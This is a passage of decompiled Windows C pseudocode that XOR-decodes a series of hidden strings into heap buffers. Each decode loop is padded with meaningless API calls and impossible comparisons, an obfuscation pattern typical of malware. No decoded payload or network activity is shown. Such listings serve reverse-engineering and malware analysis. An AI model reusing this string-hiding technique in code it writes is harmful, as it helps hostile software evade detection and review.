var_c0h;\n    int32_t var_bch;\n    uint var_b8h;\n    int32_t var_b4h;\n    uint var_b0h;\n    int32_t var_ach;\n    uint var_a8h;\n    int32_t var_a4h;\n    uint var_a0h;\n    int32_t var_9ch;\n    uint var_98h;\n    int32_t var_94h;\n    uint var_90h;\n    int32_t var_8ch;\n    uint var_88h;\n    int32_t var_84h;\n    uint var_80h;\n    int32_t var_7ch;\n    uint var_78h;\n    int32_t var_74h;\n    uint var_70h;\n    int32_t var_6ch;\n    uint var_68h;\n    int32_t var_64h;\n    uint var_60h;\n    int32_t var_5ch;\n    uint var_58h;\n    int32_t var_54h;\n    uint var_50h;\n    int32_t var_4ch;\n    uint var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    int32_t var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_18h._0_1_ = 0x62;\n    var_18h._1_1_ = 0x2d;\n    var_18h._2_1_ = 0x74;\n    var_18h._3_1_ = 0x22;\n    var_14h._0_1_ = 0x28;\n    var_14h._1_1_ = 0x50;\n    var_14h._2_1_ = 0x3c;\n    var_14h._3_1_ = 0x52;\n    var_10h._0_1_ = 4;\n    var_10h._1_1_ = 0x22;\n    var_10h._2_1_ = 0x5a;\n    var_10h._3_1_ = 0x2d;\n    var_ch._0_1_ = 0x59;\n    var_ch._1_1_ = 0;\n    var_ch._2_1_ = 0x3f;\n    var_ch._3_1_ = 0x58;\n    var_8h._0_1_ = 0x3e;\n    var_8h._1_1_ = 0x5e;\n    var_8h._2_1_ = 0x3c;\n    var_8h._3_1_ = 0x28;\n    var_4h._0_1_ = 0x56;\n    var_4h._1_1_ = 0x2d;\n    var_4h._2_1_ = 0x37;\n    var_ach = 0x50374831;\n    var_a8h._0_1_ = 0x4d;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x18);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    var_34h = 5;\n    iVar7 = 0;\n    do {\n        iVar5 = (*_sym.imp.USER32.dll_GetClipboardSequenceNumber)();\n        if (iVar5 != 0xb22615) {\n            *(iVar7 + iVar4) = *(&var_ach + iVar7 % var_34h) ^ (iVar7 + iVar4)[&var_18h - iVar4];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x17);\n    fcn.0040cda0();\n    var_20h = 0x142f2901;\n    var_1ch._0_1_ = 0x3d;\n    var_1ch._1_1_ = 0x2d;\n    var_1ch._2_1_ = 0x35;\n    var_1ch._3_1_ = 0x22;\n    var_18h._0_1_ = 0x3e;\n    var_18h._1_1_ = 0x15;\n    var_18h._2_1_ = 0x27;\n    var_18h._3_1_ = 0x29;\n    var_14h._0_1_ = 0x33;\n    var_14h._1_1_ = 0x3e;\n    var_14h._2_1_ = 0x17;\n    var_14h._3_1_ = 0x33;\n    var_10h._0_1_ = 0x21;\n    var_10h._1_1_ = 0x2f;\n    var_10h._2_1_ = 0x37;\n    var_10h._3_1_ = 0x22;\n    var_ch._0_1_ = 0x3e;\n    var_ch._1_1_ = 0x15;\n    var_ch._2_1_ = 0x27;\n    var_ch._3_1_ = 0x32;\n    var_8h._0_1_ = 0x3b;\n    var_8h._1_1_ = 0x20;\n    var_8h._2_1_ = 0xb;\n    var_8h._3_1_ = 0;\n    var_4h._0_1_ = 0x2b;\n    var_4h._1_1_ = 0x44;\n    var_124h = 0x676e4c52;\n    var_120h._0_2_ = 0x444e;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1f);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    var_2ch = 6;\n    iVar5 = 0;\n    var_ach = iVar7;\n    var_24h = &var_20h - iVar7;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetInputState)();\n        if (iVar6 != 0xd92619) {\n            *(iVar5 + iVar7) = *(&var_124h + iVar5 % var_2ch) ^ (iVar5 + iVar7)[&var_20h - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x1e);\n    fcn.0040cda0();\n    var_18h._0_1_ = 9;\n    var_18h._1_1_ = 0x14;\n    var_18h._2_1_ = 0xd;\n    var_18h._3_1_ = 0xc;\n    var_14h._0_1_ = 0x1a;\n    var_14h._1_1_ = 0x27;\n    var_14h._2_1_ = 0x17;\n    var_14h._3_1_ = 0x14;\n    var_10h._0_1_ = 0x2c;\n    var_10h._1_1_ = 0xc;\n    var_10h._2_1_ = 0xb;\n    var_10h._3_1_ = 0x35;\n    var_ch._0_1_ = 10;\n    var_ch._1_1_ = 3;\n    var_ch._2_1_ = 0x28;\n    var_ch._3_1_ = 0x15;\n    var_8h._0_1_ = 0x10;\n    var_8h._1_1_ = 0x20;\n    var_8h._2_1_ = 0x3f;\n    var_8h._3_1_ = 0x16;\n    var_4h._0_1_ = 0x24;\n    var_4h._1_1_ = 99;\n    var_11ch = 0x6341715a;\n    var_118h._0_2_ = 0x4c79;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x17);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_124h = iVar7;\n    var_24h = &var_18h - iVar7;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetDialogBaseUnits)();\n        if (iVar6 != 0xcd8ac9) {\n            *(iVar5 + iVar7) = *(&var_11ch + iVar5 % var_2ch) ^ (iVar5 + iVar7)[&var_18h - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x16);\n    fcn.0040cda0();\n    var_1ch._0_1_ = 4;\n    var_1ch._1_1_ = 0x3d;\n    var_1ch._2_1_ = 0xf;\n    var_1ch._3_1_ = 6;\n    var_18h._0_1_ = 0x53;\n    var_18h._1_1_ = 0x36;\n    var_18h._2_1_ = 0x32;\n    var_18h._3_1_ = 0x39;\n    var_14h._0_1_ = 0x35;\n    var_14h._1_1_ = 0xd;\n    var_14h._2_1_ = 0x61;\n    var_14h._3_1_ = 0x31;\n    var_10h._0_1_ = 0x38;\n    var_10h._1_1_ = 0x2c;\n    var_10h._2_1_ = 0x27;\n    var_10h._3_1_ = 0x38;\n    var_ch._0_1_ = 0x42;\n    var_ch._1_1_ = 0x2d;\n    var_ch._2_1_ = 0x21;\n    var_ch._3_1_ = 0x31;\n    var_8h._0_1_ = 0x2a;\n    var_8h._1_1_ = 0xd;\n    var_8h._2_1_ = 0x57;\n    var_8h._3_1_ = 0x21;\n    var_4h._0_1_ = 0x57;\n    var_114h = 0x68465857;\n    var_110h._0_2_ = 0x4430;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1a);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_11ch = iVar7;\n    var_24h = &var_1ch - iVar7;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_CreateMenu)();\n        if (iVar6 != 0x557291) {\n            *(iVar5 + iVar7) = *(&var_114h + iVar5 % var_2ch) ^ (iVar5 + iVar7)[&var_1ch - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x19);\n    fcn.0040cda0();\n    var_1ch._0_1_ = 3;\n    var_1ch._1_1_ = 0x35;\n    var_1ch._2_1_ = 0x37;\n    var_1ch._3_1_ = 0x3e;\n    var_18h._0_1_ = 0x26;\n    var_18h._1_1_ = 0x23;\n    var_18h._2_1_ = 0x3c;\n    var_18h._3_1_ = 0x39;\n    var_14h._0_1_ = 1;\n    var_14h._1_1_ = 0x39;\n    var_14h._2_1_ = 0x21;\n    var_14h._3_1_ = 0x29;\n    var_10h._0_1_ = 0x34;\n    var_10h._1_1_ = 0x19;\n    var_10h._2_1_ = 0xc;\n    var_10h._3_1_ = 0x20;\n    var_ch._0_1_ = 0x20;\n    var_ch._1_1_ = 0x38;\n    var_ch._2_1_ = 0;\n    var_ch._3_1_ = 0x22;\n    var_8h._0_1_ = 0xb;\n    var_8h._1_1_ = 0x26;\n    var_8h._2_1_ = 0x3c;\n    var_8h._3_1_ = 0x20;\n    var_4h._0_1_ = 0x35;\n    var_4h._1_1_ = 0x37;\n    var_4h._2_1_ = 7;\n    var_4h._3_1_ = 0x50;\n    var_10ch = 0x50625050;\n    var_108h._0_2_ = 0x4c55;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1d);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_114h = iVar7;\n    var_24h = &var_1ch - iVar7;\n    do {\n        iVar6 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n        if (iVar6 != 0xf5ae09) {\n            *(iVar5 + iVar7) = *(&var_10ch + iVar5 % var_2ch) ^ (iVar5 + iVar7)[&var_1ch - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x1c);\n    fcn.0040cda0();\n    var_1ch._0_1_ = 0x20;\n    var_1ch._1_1_ = 0x34;\n    var_1ch._2_1_ = 0x24;\n    var_1ch._3_1_ = 0x12;\n    var_18h._0_1_ = 10;\n    var_18h._1_1_ = 0x1b;\n    var_18h._2_1_ = 0x38;\n    var_18h._3_1_ = 7;\n    var_14h._0_1_ = 0x16;\n    var_14h._1_1_ = 0x28;\n    var_14h._2_1_ = 0x10;\n    var_14h._3_1_ = 0x32;\n    var_10h._0_1_ = 6;\n    var_10h._2_1_ = 7;\n    var_10h._3_1_ = 7;\n    var_ch._0_1_ = 1;\n    var_ch._1_1_ = 0x1b;\n    var_ch._2_1_ = 0x1a;\n    var_ch._3_1_ = 0x1f;\n    var_8h._0_1_ = 0x1a;\n    var_8h._1_1_ = 0x3d;\n    var_8h._2_1_ = 0xc;\n    var_8h._3_1_ = 0x14;\n    var_4h._0_1_ = 0xc;\n    var_4h._1_1_ = 0x73;\n    var_9ch = 0x73695173;\n    var_98h._0_1_ = 0x69;\n    var_10h._1_1_ = var_10h;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1b);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_10ch = iVar7;\n    var_24h = &var_1ch - iVar7;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_CreateMenu)();\n        if (iVar6 != 0x69f5f9) {\n            *(iVar5 + iVar7) = *(&var_9ch + iVar5 % var_34h) ^ (iVar5 + iVar7)[&var_1ch - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x1a);\n    fcn.0040cda0();\n    var_10h._0_1_ = 9;\n    var_10h._1_1_ = 0x30;\n    var_10h._2_1_ = 0x66;\n    var_10h._3_1_ = 0x3a;\n    var_ch._0_1_ = 0x56;\n    var_ch._1_1_ = 10;\n    var_ch._2_1_ = 0x27;\n    var_ch._3_1_ = 0x5b;\n    var_8h._0_1_ = 0x2f;\n    var_8h._1_1_ = 0x5d;\n    var_8h._2_1_ = 0x36;\n    var_8h._3_1_ = 0x30;\n    var_4h._0_1_ = 0x55;\n    var_4h._1_1_ = 0x3c;\n    var_4h._2_1_ = 0x34;\n    var_7ch = 0x5932555a;\n    var_78h._0_1_ = 0x34;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x10);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_9ch = iVar7;\n    var_24h = &var_10h - iVar7;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_ReleaseCapture)();\n        if (iVar6 != 0xb25e27) {\n            *(iVar5 + iVar7) = *(&var_7ch + iVar5 % var_34h) ^ (iVar5 + iVar7)[&var_10h - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0xf);\n    fcn.0040cda0();\n    var_14h._0_1_ = 0x27;\n    var_14h._1_1_ = 3;\n    var_14h._2_1_ = 7;\n    var_14h._3_1_ = 0x22;\n    var_10h._0_1_ = 0x55;\n    var_10h._1_1_ = 0x32;\n    var_10h._2_1_ = 6;\n    var_10h._3_1_ = 0xf;\n    var_ch._0_1_ = 0x20;\n    var_ch._1_1_ = 0x3e;\n    var_ch._2_1_ = 0x66;\n    var_ch._3_1_ = 0x35;\n    var_8h._0_1_ = 0x1d;\n    var_8h._1_1_ = 0x10;\n    var_8h._2_1_ = 0x3d;\n    var_8h._3_1_ = 0x2b;\n    var_4h._0_1_ = 0x53;\n    var_4h._1_1_ = 0x20;\n    var_4h._2_1_ = 0x11;\n    var_4h._3_1_ = 0x66;\n    var_f4h = 0x47546674;\n    var_f0h._0_2_ = 0x4736;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_7ch = iVar7;\n    var_24h = &var_14h - iVar7;\n    do {\n        iVar6 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n        if (iVar6 != 0xa7d168) {\n            *(iVar5 + iVar7) = *(&var_f4h + iVar5 % var_2ch) ^ (iVar5 + iVar7)[&var_14h - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x14);\n    fcn.0040cda0();\n    var_1ch._0_1_ = 5;\n    var_1ch._1_1_ = 0x12;\n    var_1ch._2_1_ = 0x35;\n    var_1ch._3_1_ = 0x28;\n    var_18h._0_1_ = 0x5d;\n    var_18h._1_1_ = 0x33;\n    var_18h._2_1_ = 0x38;\n    var_18h._3_1_ = 0x16;\n    var_14h._0_1_ = 0x27;\n    var_14h._1_1_ = 0x53;\n    var_14h._2_1_ = 0x24;\n    var_14h._3_1_ = 4;\n    var_10h._0_1_ = 9;\n    var_10h._1_1_ = 0x20;\n    var_10h._2_1_ = 0x46;\n    var_10h._3_1_ = 6;\n    var_ch._1_1_ = 8;\n    var_ch._2_1_ = 0x3f;\n    var_ch._3_1_ = 0x5f;\n    var_8h._0_1_ = 0x3a;\n    var_8h._1_1_ = 0x12;\n    var_8h._3_1_ = 0x2c;\n    var_4h._0_1_ = 0x36;\n    var_74h = 0x49617756;\n    var_70h._0_1_ = 0x36;\n    var_ch._0_1_ = var_1ch;\n    var_8h._2_1_ = var_10h._3_1_;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1a);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_f4h = iVar7;\n    var_24h = &var_1ch - iVar7;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetMessageTime)();\n        if (iVar6 != 0x2122f8) {\n            *(iVar5 + iVar7) = *(&var_74h + iVar5 % var_34h) ^ (iVar5 + iVar7)[&var_1ch - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x19);\n    fcn.0040cda0();\n    var_18h._0_1_ = 0x66;\n    var_18h._1_1_ = 0x52;\n    var_18h._2_1_ = 0x1f;\n    var_18h._3_1_ = 0x3e;\n    var_14h._0_1_ = 0x39;\n    var_14h._1_1_ = 0x2f;\n    var_14h._2_1_ = 0x71;\n    var_14h._3_1_ = 0x45;\n    var_10h._0_1_ = 0x3a;\n    var_10h._1_1_ = 0x27;\n    var_10h._2_1_ = 0x3d;\n    var_10h._3_1_ = 0x39;\n    var_ch._0_1_ = 0x65;\n    var_ch._1_1_ = 0x45;\n    var_ch._2_1_ = 0x3a;\n    var_ch._3_1_ = 0x27;\n    var_8h._0_1_ = 0x31;\n    var_8h._1_1_ = 0x27;\n    var_8h._2_1_ = 0x50;\n    var_8h._3_1_ = 0x50;\n    var_4h._0_1_ = 0x36;\n    var_4h._1_1_ = 0x51;\n    var_104h = 0x51533735;\n    var_100h._0_2_ = 0x4b58;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x17);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_74h = iVar7;\n    var_24h = &var_18h - iVar7;\n    do {\n        iVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar6 != 0x128452) {\n            *(iVar5 + iVar7) = *(&var_104h + iVar5 % var_2ch) ^ (iVar5 + iVar7)[&var_18h - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x16);\n    fcn.0040cda0();\n    var_1ch._0_1_ = 0x1f;\n    var_1ch._1_1_ = 0x2f;\n    var_1ch._2_1_ = 0x22;\n    var_1ch._3_1_ = 0x36;\n    var_18h._0_1_ = 4;\n    var_18h._1_1_ = 0x38;\n    var_18h._2_1_ = 0x2f;\n    var_18h._3_1_ = 0x1c;\n    var_14h._0_1_ = 0x1f;\n    var_14h._1_1_ = 5;\n    var_14h._2_1_ = 0x23;\n    var_14h._3_1_ = 0x2c;\n    var_10h._0_1_ = 0x18;\n    var_10h._1_1_ = 0x23;\n    var_10h._2_1_ = 0x12;\n    var_10h._3_1_ = 0x1c;\n    var_ch._0_1_ = 0x38;\n    var_ch._1_1_ = 0x18;\n    var_ch._2_1_ = 0x39;\n    var_ch._3_1_ = 0x1e;\n    var_8h._0_1_ = 0x20;\n    var_8h._1_1_ = 0x2f;\n    var_8h._2_1_ = 0x16;\n    var_8h._3_1_ = 0x2a;\n    var_4h._0_1_ = 0x77;\n    var_44h = 0x4f714a4c;\n    var_40h._0_1_ = 0x77;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1a);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_104h = iVar7;\n    var_24h = &var_1ch - iVar7;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetOpenClipboardWindow)();\n        if (iVar6 != 0xe14807) {\n            *(iVar5 + iVar7) = *(&var_44h + iVar5 % var_34h) ^ (iVar5 + iVar7)[&var_1ch - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x19);\n    fcn.0040cda0();\n    var_18h._0_1_ = 2;\n    var_18h._1_1_ = 0x1c;\n    var_18h._2_1_ = 0x22;\n    var_18h._3_1_ = 0x18;\n    var_14h._0_1_ = 5;\n    var_14h._1_1_ = 2;\n    var_14h._2_1_ = 0x34;\n    var_14h._3_1_ = 0x14;\n    var_10h._1_1_ = 8;\n    var_10h._2_1_ = 0x1b;\n    var_10h._3_1_ = 0x13;\n    var_ch._0_1_ = 1;\n    var_ch._1_1_ = 0xb;\n    var_ch._2_1_ = 0x18;\n    var_ch._3_1_ = 0x17;\n    var_8h._0_1_ = 0x1f;\n    var_8h._1_1_ = 0x1a;\n    var_8h._2_1_ = 0x34;\n    var_8h._3_1_ = 0x1e;\n    var_4h._0_1_ = 0x14;\n    var_4h._1_1_ = 0x61;\n    var_12ch = 0x61717951;\n    var_128h._0_2_ = 0x7676;\n    var_10h._0_1_ = var_14h;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x17);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_44h = iVar7;\n    var_24h = &var_18h - iVar7;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetInputState)();\n        if (iVar6 != 0xa7dfe2) {\n            *(iVar5 + iVar7) = *(&var_12ch + iVar5 % var_2ch) ^ (iVar5 + iVar7)[&var_18h - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x16);\n    fcn.0040cda0();\n    var_20h = 0x1345d31;\n    var_1ch._0_1_ = 0x1c;\n    var_1ch._1_1_ = 0;\n    var_1ch._2_1_ = 0xb;\n    var_1ch._3_1_ = 0x54;\n    var_18h._0_1_ = 1;\n    var_18h._1_1_ = 0x20;\n    var_18h._2_1_ = 0x1a;\n    var_18h._3_1_ = 8;\n    var_14h._0_1_ = 5;\n    var_14h._1_1_ = 0x54;\n    var_14h._2_1_ = 1;\n    var_14h._3_1_ = 0x23;\n    var_10h._0_1_ = 1;\n    var_10h._1_1_ = 9;\n    var_10h._2_1_ = 1;\n    var_10h._3_1_ = 0x5d;\n    var_ch._0_1_ = 0x17;\n    var_ch._1_1_ = 0;\n    var_ch._2_1_ = 0x23;\n    var_ch._3_1_ = 0x14;\n    var_8h._0_1_ = 0xb;\n    var_8h._1_1_ = 0x4e;\n    var_8h._2_1_ = 0xd;\n    var_8h._3_1_ = 0x1f;\n    var_4h._0_1_ = 0x16;\n    var_4h._1_1_ = 1;\n    var_4h._2_1_ = 7;\n    var_4h._3_1_ = 0x38;\n    var_fch = 0x73643862;\n    var_f8h._0_2_ = 0x6673;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x21);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_12ch = iVar7;\n    var_24h = &var_20h - iVar7;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetClipboardSequenceNumber)();\n        if (iVar6 != 0xa8bc97) {\n            *(iVar5 + iVar7) = *(&var_fch + iVar5 % var_2ch) ^ (iVar5 + iVar7)[&var_20h - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x20);\n    fcn.0040cda0();\n    var_20h = 0x3c7e5139;\n    var_1ch._0_1_ = 0x22;\n    var_1ch._1_1_ = 0x18;\n    var_1ch._2_1_ = 0x51;\n    var_1ch._3_1_ = 0x56;\n    var_18h._0_1_ = 0x21;\n    var_18h._1_1_ = 0x24;\n    var_18h._2_1_ = 0x28;\n    var_18h._3_1_ = 0x55;\n    var_14h._0_1_ = 0x44;\n    var_14h._1_1_ = 0x37;\n    var_14h._2_1_ = 0x11;\n    var_14h._3_1_ = 0x18;\n    var_10h._0_1_ = 0x5d;\n    var_10h._1_1_ = 0x58;\n    var_10h._2_1_ = 0x20;\n    var_10h._3_1_ = 0x28;\n    var_ch._0_1_ = 0x1e;\n    var_ch._1_1_ = 0x4d;\n    var_ch._2_1_ = 0x67;\n    var_ch._3_1_ = 0x20;\n    var_8h._0_1_ = 0x28;\n    var_8h._1_1_ = 0x1c;\n    var_8h._2_1_ = 0x5d;\n    var_8h._3_1_ = 0x5b;\n    var_4h._0_1_ = 0x37;\n    var_4h._1_1_ = 0x26;\n    var_4h._2_1_ = 0xf;\n    var_4h._3_1_ = 0x34;\n    var_c4h = 0x5237346a;\n    var_c0h._0_1_ = 0x41;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x21);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_fch = iVar7;\n    var_24h = &var_20h - iVar7;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetProcessWindowStation)();\n        if (iVar6 != 0xd20862) {\n            *(iVar5 + iVar7) = *(&var_c4h + iVar5 % var_34h) ^ (iVar5 + iVar7)[&var_20h - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x20);\n    fcn.0040cda0();\n    var_1ch._0_1_ = 0x3e;\n    var_1ch._1_1_ = 0x2e;\n    var_1ch._2_1_ = 0x2c;\n    var_1ch._3_1_ = 0x3d;\n    var_18h._0_1_ = 0x26;\n    var_18h._1_1_ = 0;\n    var_18h._2_1_ = 0x19;\n    var_18h._3_1_ = 0x2e;\n    var_14h._0_1_ = 0x3f;\n    var_14h._1_1_ = 0x2e;\n    var_14h._2_1_ = 0x24;\n    var_14h._3_1_ = 4;\n    var_10h._0_1_ = 0xb;\n    var_10h._1_1_ = 0x22;\n    var_10h._2_1_ = 3;\n    var_10h._3_1_ = 0x2a;\n    var_ch._0_1_ = 0x13;\n    var_ch._1_1_ = 0x13;\n    var_ch._2_1_ = 4;\n    var_ch._3_1_ = 0x3d;\n    var_8h._0_1_ = 6;\n    var_8h._1_1_ = 0x23;\n    var_8h._2_1_ = 0x26;\n    var_4h._0_1_ = 8;\n    var_4h._1_1_ = 0x4b;\n    var_13ch = 0x4f6f4b6d;\n    var_138h._0_2_ = 0x6143;\n    var_8h._3_1_ = var_8h;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1b);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_c4h = iVar7;\n    var_24h = &var_1ch - iVar7;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetMessageTime)();\n        if (iVar6 != 0x2b40c1) {\n            *(iVar5 + iVar7) = *(&var_13ch + iVar5 % var_2ch) ^ (iVar5 + iVar7)[&var_1ch - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x1a);\n    fcn.0040cda0();\n    var_1ch._0_1_ = 10;\n    var_1ch._1_1_ = 0x1f;\n    var_1ch._2_1_ = 0xf;\n    var_1ch._3_1_ = 0x17;\n    var_18h._0_1_ = 0x57;\n    var_18h._1_1_ = 0x38;\n    var_18h._2_1_ = 0xe;\n    var_18h._3_1_ = 0x29;\n    var_14h._0_1_ = 0x35;\n    var_14h._1_1_ = 0x57;\n    var_14h._2_1_ = 0x2b;\n    var_14h._3_1_ = 0x17;\n    var_10h._0_1_ = 0x2d;\n    var_10h._1_1_ = 0xb;\n    var_10h._2_1_ = 0x57;\n    var_10h._3_1_ = 0x37;\n    var_ch._0_1_ = 0xe;\n    var_ch._1_1_ = 0x1c;\n    var_ch._2_1_ = 0x17;\n    var_ch._3_1_ = 0x5b;\n    var_8h._0_1_ = 0x2f;\n    var_8h._1_1_ = 0x13;\n    var_8h._2_1_ = 0x20;\n    var_8h._3_1_ = 0;\n    var_4h._0_1_ = 0x55;\n    var_4h._1_1_ = 0x3c;\n    var_4h._2_1_ = 0x7a;\n    var_b4h = 0x654c7a59;\n    var_b0h._0_1_ = 0x32;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1c);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_13ch = iVar7;\n    var_24h = &var_1ch - iVar7;\n    do {\n        iVar6 = (*_sym.imp.KERNEL32.dll_GetLogicalDrives)();\n        if (iVar6 != 0x23ce47) {\n            *(iVar5 + iVar7) = *(&var_b4h + iVar5 % var_34h) ^ (iVar5 + iVar7)[&var_1ch - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x1b);\n    fcn.0040cda0();\n    var_14h._0_1_ = 0x26;\n    var_14h._1_1_ = 0x37;\n    var_14h._2_1_ = 0xe;\n    var_14h._3_1_ = 0xc;\n    var_10h._0_1_ = 0;\n    var_10h._1_1_ = 0x1e;\n    var_10h._2_1_ = 0x27;\n    var_10h._3_1_ = 0x3c;\n    var_ch._0_1_ = 0x3d;\n    var_ch._1_1_ = 0x11;\n    var_ch._2_1_ = 0x1c;\n    var_ch._3_1_ = 0x24;\n    var_8h._0_1_ = 0x25;\n    var_8h._1_1_ = 1;\n    var_8h._2_1_ = 6;\n    var_8h._3_1_ = 0x12;\n    var_4h._0_1_ = 0x37;\n    var_4h._1_1_ = 0x4c;\n    var_bch = 0x6d4c5275;\n    var_b8h._0_1_ = 99;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x13);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_b4h = iVar7;\n    var_24h = &var_14h - iVar7;\n    do {\n        iVar6 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n        if (iVar6 != 0x295b94) {\n            *(iVar5 + iVar7) = *(&var_bch + iVar5 % var_34h) ^ (iVar5 + iVar7)[&var_14h - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x12);\n    fcn.0040cda0();\n    var_14h._0_1_ = 0x23;\n    var_14h._1_1_ = 0x11;\n    var_14h._2_1_ = 0x34;\n    var_14h._3_1_ = 0x3f;\n    var_10h._0_1_ = 0x15;\n    var_10h._1_1_ = 0x23;\n    var_10h._2_1_ = 0x1f;\n    var_10h._3_1_ = 6;\n    var_ch._0_1_ = 3;\n    var_ch._1_1_ = 10;\n    var_ch._2_1_ = 0x14;\n    var_ch._3_1_ = 0x3e;\n    var_8h._1_1_ = 0x1d;\n    var_8h._2_1_ = 10;\n    var_8h._3_1_ = 0x3f;\n    var_4h._0_1_ = 1;\n    var_4h._1_1_ = 0x32;\n    var_4h._2_1_ = 0x70;\n    var_134h = 0x5a667470;\n    var_130h._0_2_ = 0x5766;\n    var_8h._0_1_ = var_10h._3_1_;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x14);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_bch = iVar7;\n    var_24h = &var_14h - iVar7;\n    do {\n        iVar6 = (*_sym.imp.KERNEL32.dll_GetLogicalDrives)();\n        if (iVar6 != 0x32d5ff) {\n            *(iVar5 + iVar7) = *(&var_134h + iVar5 % var_2ch) ^ (iVar5 + iVar7)[&var_14h - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x13);\n    fcn.0040cda0();\n    var_14h._0_1_ = 0x23;\n    var_14h._1_1_ = 0x2a;\n    var_14h._2_1_ = 0x18;\n    var_14h._3_1_ = 